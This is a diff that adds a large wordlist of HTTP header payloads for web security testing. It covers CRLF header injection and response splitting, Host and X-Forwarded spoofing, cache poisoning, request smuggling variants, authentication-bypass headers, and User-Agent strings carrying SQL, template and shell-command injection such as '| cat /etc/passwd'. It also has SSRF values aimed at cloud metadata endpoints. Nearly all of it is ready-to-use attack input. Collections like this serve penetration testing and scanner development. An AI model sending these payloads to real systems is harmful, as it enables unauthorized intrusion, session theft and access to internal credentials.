@@ -1,0 +1,611 @@
+# Security Headers and Header Injection Payloads - Comprehensive Collection (500+)
+# Categories: Security Headers to Check, Header Injection, Response Splitting, Bypass Tests
+
+# ==================== SECURITY HEADERS TO CHECK (MISSING) ====================
+# These headers should be present for security
+Strict-Transport-Security
+Content-Security-Policy
+X-Content-Type-Options
+X-Frame-Options
+X-XSS-Protection
+Referrer-Policy
+Permissions-Policy
+Cross-Origin-Embedder-Policy
+Cross-Origin-Opener-Policy
+Cross-Origin-Resource-Policy
+Cache-Control
+Pragma
+Expires
+Set-Cookie
+Access-Control-Allow-Origin
+Access-Control-Allow-Credentials
+Access-Control-Allow-Methods
+Access-Control-Allow-Headers
+Access-Control-Max-Age
+Access-Control-Expose-Headers
+Feature-Policy
+Expect-CT
+X-Permitted-Cross-Domain-Policies
+X-Download-Options
+X-Content-Security-Policy
+X-WebKit-CSP
+Public-Key-Pins
+Public-Key-Pins-Report-Only
+Content-Security-Policy-Report-Only
+Clear-Site-Data
+Sec-Fetch-Site
+Sec-Fetch-Mode
+Sec-Fetch-User
+Sec-Fetch-Dest
+Cross-Origin-Resource-Policy
+Document-Policy
+NEL
+Report-To
+Timing-Allow-Origin
+X-DNS-Prefetch-Control
+Origin-Agent-Cluster
+
+# ==================== HSTS CONFIGURATION TESTS ====================
+Strict-Transport-Security: max-age=0
+Strict-Transport-Security: max-age=86400
+Strict-Transport-Security: max-age=31536000
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+Strict-Transport-Security: max-age=
+Strict-Transport-Security: max-age=abc
+Strict-Transport-Security: max-age=-1
+Strict-Transport-Security: includeSubDomains
+Strict-Transport-Security: preload
+
+# ==================== CSP BYPASS TESTS ====================
+Content-Security-Policy: default-src 'self'
+Content-Security-Policy: default-src *
+Content-Security-Policy: default-src 'unsafe-inline'
+Content-Security-Policy: default-src 'unsafe-eval'
+Content-Security-Policy: default-src data:
+Content-Security-Policy: default-src blob:
+Content-Security-Policy: script-src 'self' 'unsafe-inline'
+Content-Security-Policy: script-src 'self' 'unsafe-eval'
+Content-Security-Policy: script-src 'self' data:
+Content-Security-Policy: script-src *
+Content-Security-Policy: script-src 'self' *.google.com
+Content-Security-Policy: script-src 'self' *.googleapis.com
+Content-Security-Policy: script-src 'self' *.cloudflare.com
+Content-Security-Policy: script-src 'self' *.jsdelivr.net
+Content-Security-Policy: script-src 'self' 'nonce-abc123'
+Content-Security-Policy: script-src 'self' 'sha256-abc123'
+Content-Security-Policy: object-src 'none'
+Content-Security-Policy: base-uri 'self'
+Content-Security-Policy: form-action 'self'
+Content-Security-Policy: frame-ancestors 'none'
+Content-Security-Policy: frame-ancestors 'self'
+Content-Security-Policy: report-uri /csp-report
+Content-Security-Policy: upgrade-insecure-requests
+Content-Security-Policy: block-all-mixed-content
+
+# ==================== X-FRAME-OPTIONS TESTS ====================
+X-Frame-Options: DENY
+X-Frame-Options: SAMEORIGIN
+X-Frame-Options: ALLOW-FROM http://example.com
+X-Frame-Options: ALLOWALL
+X-Frame-Options: ALLOW-FROM *
+X-Frame-Options:
+X-Frame-Options: deny
+X-Frame-Options: sameorigin
+X-Frame-Options: allow-from http://evil.com
+
+# ==================== CORS MISCONFIGURATION TESTS ====================
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Origin: http://evil.com
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+Access-Control-Allow-Headers: X-Custom-Header, Authorization
+Access-Control-Expose-Headers: *
+Access-Control-Max-Age: 86400
+Access-Control-Max-Age: 0
+Access-Control-Max-Age: -1
+
+# ==================== COOKIE SECURITY TESTS ====================
+Set-Cookie: session=abc123
+Set-Cookie: session=abc123; Secure
+Set-Cookie: session=abc123; HttpOnly
+Set-Cookie: session=abc123; Secure; HttpOnly
+Set-Cookie: session=abc123; SameSite=Strict
+Set-Cookie: session=abc123; SameSite=Lax
+Set-Cookie: session=abc123; SameSite=None
+Set-Cookie: session=abc123; SameSite=None; Secure
+Set-Cookie: session=abc123; Path=/
+Set-Cookie: session=abc123; Domain=.example.com
+Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
+Set-Cookie: session=abc123; Max-Age=3600
+Set-Cookie: session=abc123; Expires=Thu, 01 Jan 2099 00:00:00 GMT
+Set-Cookie: __Host-session=abc123; Secure; Path=/
+Set-Cookie: __Secure-session=abc123; Secure
+
+# ==================== HEADER INJECTION PAYLOADS ====================
+%0d%0aX-Injected-Header: injected
+%0aX-Injected-Header: injected
+%0dX-Injected-Header: injected
+%0d%0a%0d%0aX-Injected-Header: injected
+%0D%0AX-Injected-Header: injected
+%0AX-Injected-Header: injected
+%0DX-Injected-Header: injected
+%0D%0A%0D%0AX-Injected-Header: injected
+%E5%98%8A%E5%98%8DX-Injected: injected
+%E5%98%8AX-Injected: injected
+%E5%98%8DX-Injected: injected
+\r\nX-Injected-Header: injected
+\nX-Injected-Header: injected
+\rX-Injected-Header: injected
+\r\n\r\nX-Injected-Header: injected
+%c0%8d%c0%8aX-Injected: injected
+%c0%0d%c0%0aX-Injected: injected
+%250d%250aX-Injected: injected
+%25%30%64%25%30%61X-Injected: injected
+%u000d%u000aX-Injected: injected
+\u000d\u000aX-Injected: injected
+%00%0d%0aX-Injected: injected
+%0d%0a%20X-Injected: injected
+%0d%0a%09X-Injected: injected
+
+# ==================== HTTP RESPONSE SPLITTING ====================
+%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Injected</html>
+%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0a%0d%0a<html>Injected</html>
+%0d%0aSet-Cookie: injected=true
+%0d%0aLocation: http://evil.com
+%0d%0aRefresh: 0;url=http://evil.com
+%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aHTTP/1.1 200 OK%0d%0a
+%0d%0aHTTP/1.0 200 OK%0d%0a
+%0d%0a%0d%0aHTTP/1.1 200 OK
+\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>Injected</html>
+\r\nHTTP/1.1 200 OK\r\n
+\r\n\r\n<script>alert(1)</script>
+%00%0d%0aHTTP/1.1 200 OK%0d%0a
+%c0%0d%c0%0aHTTP/1.1 200 OK
+%E5%98%8A%E5%98%8DHTTP/1.1 200 OK
+
+# ==================== HOST HEADER INJECTION ====================
+evil.com
+localhost
+127.0.0.1
+10.0.0.1
+192.168.1.1
+169.254.169.254
+[::1]
+0.0.0.0
+example.com.evil.com
+evil.com#.example.com
+evil.com?.example.com
+evil.com\.example.com
+evil.com/.example.com
+evil.com@example.com
+example.com@evil.com
+evil.com:80@example.com
+evil.com%23.example.com
+evil.com%00.example.com
+evil.com%0d%0a.example.com
+example.com:@evil.com
+example.com.:evil.com
+example.com%0d%0aX-Injected: evil
+example.com%20.evil.com
+example.com%09evil.com
+Example.Com
+EXAMPLE.COM
+eXaMpLe.CoM
+example.com:443
+example.com:80
+example.com:8080
+example.com:8443
+example.com:81
+example.com:444
+example.com:evil
+localhost:80
+localhost:443
+127.0.0.1:80
+0.0.0.0:80
+[::]:80
+subdomain.example.com
+api.example.com
+admin.example.com
+internal.example.com
+
+# ==================== X-FORWARDED HEADERS ====================
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 192.168.1.1
+X-Forwarded-For: 169.254.169.254
+X-Forwarded-For: evil.com
+X-Forwarded-For: [::1]
+X-Forwarded-For: 0.0.0.0
+X-Forwarded-For: 127.0.0.1, 10.0.0.1
+X-Forwarded-For: evil.com, 127.0.0.1
+X-Forwarded-For: 127.0.0.1%0d%0aX-Injected: true
+X-Forwarded-Host: evil.com
+X-Forwarded-Host: localhost
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Proto: http
+X-Forwarded-Proto: https
+X-Forwarded-Port: 80
+X-Forwarded-Port: 443
+X-Forwarded-Port: 8080
+X-Forwarded-Scheme: http
+X-Forwarded-Scheme: https
+X-Original-URL: /admin
+X-Original-URL: /internal
+X-Original-URL: /debug
+X-Rewrite-URL: /admin
+X-Rewrite-URL: /internal
+X-Custom-IP-Authorization: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Host: localhost
+X-Originating-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-Host: localhost
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+Fastly-Client-IP: 127.0.0.1
+X-Azure-ClientIP: 127.0.0.1
+X-WAP-Profile: http://evil.com/wap.xml
+X-Arbitrary: arbitrary-value
+
+# ==================== CACHE POISONING HEADERS ====================
+X-Forwarded-Scheme: nothttps
+X-Forwarded-Scheme: http
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Host: evil.com
+X-Forwarded-Host: evil.com
+X-Original-Host: evil.com
+X-HTTP-Method-Override: POST
+X-HTTP-Method: DELETE
+X-Method-Override: PUT
+X-Original-Method: PATCH
+Origin: https://evil.com
+Referer: https://evil.com/
+X-Custom-Header: <script>alert(1)</script>
+User-Agent: <script>alert(1)</script>
+Accept-Language: en<script>alert(1)</script>
+Accept: text/html<script>alert(1)</script>
+Cookie: session=<script>alert(1)</script>
+X-Requested-With: XMLHttpRequest<script>alert(1)</script>
+
+# ==================== REQUEST SMUGGLING HEADERS ====================
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+Transfer-Encoding: compress
+Transfer-Encoding: deflate
+Transfer-Encoding: gzip
+Transfer-Encoding: x-newlines
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding:chunked
+Transfer-Encoding	: chunked
+Transfer-Encoding: identity, chunked
+Transfer-Encoding: chunked, identity
+Content-Length: 0
+Content-Length: -1
+Content-Length: 9999999
+Content-Length: 0
+Content-Length: 10
+Connection: keep-alive
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Type: multipart/form-data
+Content-Type: text/plain
+Content-Type: application/json
+Content-Type: application/xml
+Content-Type: text/xml
+
+# ==================== METHOD OVERRIDE HEADERS ====================
+X-HTTP-Method-Override: PUT
+X-HTTP-Method-Override: DELETE
+X-HTTP-Method-Override: PATCH
+X-HTTP-Method-Override: POST
+X-HTTP-Method-Override: OPTIONS
+X-HTTP-Method-Override: TRACE
+X-HTTP-Method-Override: CONNECT
+X-HTTP-Method: PUT
+X-HTTP-Method: DELETE
+X-Method-Override: PUT
+X-Method-Override: DELETE
+_method: PUT
+_method: DELETE
+_method: PATCH
+
+# ==================== AUTHENTICATION BYPASS HEADERS ====================
+X-Custom-IP-Authorization: 127.0.0.1
+X-Auth-Token: admin
+X-API-Key: admin
+Authorization: Basic YWRtaW46YWRtaW4=
+Authorization: Bearer null
+Authorization: Bearer undefined
+Authorization: Bearer admin
+Authorization: Bearer ''
+Authorization: Bearer {}
+Authorization: Bearer []
+X-Amz-Security-Token: admin
+X-Access-Token: admin
+X-Auth: admin
+Cookie: admin=true
+Cookie: role=admin
+Cookie: isAdmin=1
+Cookie: authenticated=true
+Cookie: user=admin
+Cookie: session=../../../etc/passwd
+X-Debug: true
+X-Debug-Mode: true
+X-Disable-Auth: true
+X-Bypass-Auth: true
+
+# ==================== INFORMATION DISCLOSURE HEADERS ====================
+X-Debug: 1
+X-Debug-Mode: 1
+X-Debug-Output: 1
+X-Verbose: 1
+X-Verbose-Mode: 1
+X-Show-Errors: 1
+X-Show-Debug: 1
+X-Display-Errors: 1
+Debug: true
+Debug-Mode: true
+X-Trace: true
+X-Stack-Trace: true
+X-Error-Trace: true
+
+# ==================== REFERER HEADER TESTS ====================
+Referer: http://evil.com
+Referer: https://evil.com
+Referer: http://evil.com/page
+Referer: http://localhost
+Referer: http://127.0.0.1
+Referer: http://192.168.1.1
+Referer: http://10.0.0.1
+Referer: http://169.254.169.254
+Referer: http://[::1]
+Referer: http://0.0.0.0
+Referer: file:///etc/passwd
+Referer: data:text/html,<script>alert(1)</script>
+Referer: javascript:alert(1)
+Referer: 
+Referer: null
+Referer: about:blank
+Referer: http://example.com.evil.com
+Referer: http://evil.com?http://example.com
+Referer: http://evil.com#http://example.com
+Referer: http://evil.com@example.com
+Referer: http://example.com@evil.com
+Referer: http://evil.com%00.example.com
+Referer: http://evil.com/.example.com
+Referer: http://example.com/../../
+Referer: http://example.com/%2e%2e/
+Referer: http://example.com<script>alert(1)</script>
+Referer: http://example.com%0d%0aX-Injected: true
+
+# ==================== ORIGIN HEADER TESTS ====================
+Origin: http://evil.com
+Origin: https://evil.com
+Origin: null
+Origin: http://localhost
+Origin: http://127.0.0.1
+Origin: http://example.com.evil.com
+Origin: http://evil.com.example.com
+Origin: http://exampleXcom
+Origin: http://example.com%60.evil.com
+Origin: http://example.com%0d%0aX-Injected: true
+Origin: http://example.com@evil.com
+Origin: 
+Origin: http://[::1]
+Origin: http://0.0.0.0
+Origin: file://
+Origin: data:
+
+# ==================== USER-AGENT INJECTION ====================
+User-Agent: <script>alert(1)</script>
+User-Agent: ${7*7}
+User-Agent: {{7*7}}
+User-Agent: <%=7*7%>
+User-Agent: ${${7*7}}
+User-Agent: ' OR '1'='1
+User-Agent: " OR "1"="1
+User-Agent: ; ls -la
+User-Agent: | cat /etc/passwd
+User-Agent: || whoami
+User-Agent: && id
+User-Agent: ../../../../etc/passwd
+User-Agent: %00
+User-Agent: %0d%0aX-Injected: true
+User-Agent: Googlebot/2.1
+User-Agent: curl/7.64.1
+User-Agent: wget/1.20.3
+User-Agent: python-requests/2.25.1
+User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
+User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+User-Agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+
+# ==================== ACCEPT HEADER TESTS ====================
+Accept: text/html
+Accept: application/json
+Accept: application/xml
+Accept: text/plain
+Accept: */*
+Accept: application/xhtml+xml
+Accept: text/html, application/xhtml+xml, */*
+Accept: text/html<script>alert(1)</script>
+Accept: ${7*7}
+Accept: {{7*7}}
+
+# ==================== CONTENT-TYPE TESTS ====================
+Content-Type: application/json
+Content-Type: application/xml
+Content-Type: text/xml
+Content-Type: application/x-www-form-urlencoded
+Content-Type: multipart/form-data
+Content-Type: text/plain
+Content-Type: text/html
+Content-Type: application/javascript
+Content-Type: image/svg+xml
+Content-Type: application/xhtml+xml
+Content-Type: text/csv
+Content-Type: application/pdf
+Content-Type: application/octet-stream
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+Content-Type: text/html; charset=ISO-8859-1
+Content-Type: text/html; charset=utf-7
+Content-Type: application/json; charset=UTF-8
+Content-Type: text/plain<script>alert(1)</script>
+
+# ==================== RANGE HEADER TESTS ====================
+Range: bytes=0-
+Range: bytes=0-1000
+Range: bytes=-1000
+Range: bytes=0-0
+Range: bytes=0-0,-1
+Range: bytes=1-0
+Range: bytes=-0
+Range: bytes=0-999999999999
+Range: bytes=9999999999-
+
+# ==================== IF-MODIFIED HEADERS ====================
+If-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT
+If-Modified-Since: Sun, 01 Jan 2099 00:00:00 GMT
+If-Modified-Since: invalid
+If-None-Match: *
+If-None-Match: "etag"
+If-None-Match: W/"etag"
+If-Match: *
+If-Match: "etag"
+If-Unmodified-Since: Thu, 01 Jan 1970 00:00:00 GMT
+
+# ==================== WEBSOCKET HEADERS ====================
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Protocol: chat
+Sec-WebSocket-Extensions: permessage-deflate
+Upgrade: websocket
+Connection: Upgrade
+Upgrade: h2c
+Connection: Upgrade, HTTP2-Settings
+HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA
+
+# ==================== MISCELLANEOUS SECURITY HEADERS ====================
+X-Content-Type-Options: nosniff
+X-Content-Type-Options: none
+X-XSS-Protection: 0
+X-XSS-Protection: 1
+X-XSS-Protection: 1; mode=block
+X-XSS-Protection: 1; report=/xss-report
+Referrer-Policy: no-referrer
+Referrer-Policy: no-referrer-when-downgrade
+Referrer-Policy: origin
+Referrer-Policy: origin-when-cross-origin
+Referrer-Policy: same-origin
+Referrer-Policy: strict-origin
+Referrer-Policy: strict-origin-when-cross-origin
+Referrer-Policy: unsafe-url
+Permissions-Policy: camera=()
+Permissions-Policy: geolocation=()
+Permissions-Policy: microphone=()
+Permissions-Policy: payment=()
+Permissions-Policy: accelerometer=()
+Permissions-Policy: ambient-light-sensor=()
+Permissions-Policy: autoplay=()
+Permissions-Policy: battery=()
+Permissions-Policy: display-capture=()
+Permissions-Policy: document-domain=()
+Permissions-Policy: encrypted-media=()
+Permissions-Policy: execution-while-not-rendered=()
+Permissions-Policy: execution-while-out-of-viewport=()
+Permissions-Policy: fullscreen=()
+Permissions-Policy: geolocation=()
+Permissions-Policy: gyroscope=()
+Permissions-Policy: layout-animations=()
+Permissions-Policy: legacy-image-formats=()
+Permissions-Policy: magnetometer=()
+Permissions-Policy: midi=()
+Permissions-Policy: navigation-override=()
+Permissions-Policy: oversized-images=()
+Permissions-Policy: picture-in-picture=()
+Permissions-Policy: publickey-credentials-get=()
+Permissions-Policy: sync-xhr=()
+Permissions-Policy: usb=()
+Permissions-Policy: wake-lock=()
+Permissions-Policy: xr-spatial-tracking=()
+Cross-Origin-Embedder-Policy: require-corp
+Cross-Origin-Embedder-Policy: unsafe-none
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Opener-Policy: same-origin-allow-popups
+Cross-Origin-Opener-Policy: unsafe-none
+Cross-Origin-Resource-Policy: same-origin
+Cross-Origin-Resource-Policy: same-site
+Cross-Origin-Resource-Policy: cross-origin
+
+# ==================== COMMONLY FORGOTTEN HEADERS ====================
+Expect-CT: max-age=86400, enforce
+Nel: {"report_to":"default","max_age":31536000,"include_subdomains":true}
+Report-To: {"group":"default","max_age":31536000,"endpoints":[{"url":"https://example.com/report"}]}
+X-Permitted-Cross-Domain-Policies: none
+X-Permitted-Cross-Domain-Policies: master-only
+X-Permitted-Cross-Domain-Policies: all
+X-Download-Options: noopen
+X-DNS-Prefetch-Control: off
+X-DNS-Prefetch-Control: on
+Clear-Site-Data: "cache"
+Clear-Site-Data: "cookies"
+Clear-Site-Data: "storage"
+Clear-Site-Data: "executionContexts"
+Clear-Site-Data: "*"
+
+# ==================== CUSTOM/DANGEROUS HEADERS ====================
+X-Powered-By: PHP/7.4.0
+X-Powered-By: ASP.NET
+X-AspNet-Version: 4.0.30319
+X-AspNetMvc-Version: 5.2
+Server: Apache/2.4.41 (Ubuntu)
+Server: nginx/1.18.0
+Server: Microsoft-IIS/10.0
+Via: 1.1 proxy.example.com
+X-Cache: HIT
+X-Cache: MISS
+X-Cache-Status: HIT
+X-Varnish: 123456789
+X-Request-Id: 12345-67890
+X-Correlation-Id: abc123
+X-Trace-Id: xyz789
+X-Amz-Request-Id: ABCD1234
+X-Backend-Server: internal-server-01
+X-Server-Name: prod-web-01
+X-Server-IP: 10.0.0.1
+
+# ==================== SSRF VIA HEADERS ====================
+X-Forwarded-For: http://127.0.0.1
+X-Forwarded-For: http://localhost
+X-Forwarded-For: http://169.254.169.254
+X-Forwarded-For: http://169.254.169.254/latest/meta-data
+X-Forwarded-For: http://[::1]
+X-Forwarded-For: http://0.0.0.0
+X-Forwarded-For: http://metadata.google.internal
+X-Forwarded-For: http://100.100.100.200
+X-Forwarded-For: dict://localhost:11211/stats
+X-Forwarded-For: gopher://localhost:25/
+X-Forwarded-For: file:///etc/passwd
+X-Forwarded-Host: http://evil.com
+X-Original-URL: http://127.0.0.1/admin
+X-Rewrite-URL: http://localhost/admin
+Referer: http://169.254.169.254/latest/meta-data/
+Origin: http://169.254.169.254
+Client-IP: http://127.0.0.1
+True-Client-IP: http://127.0.0.1
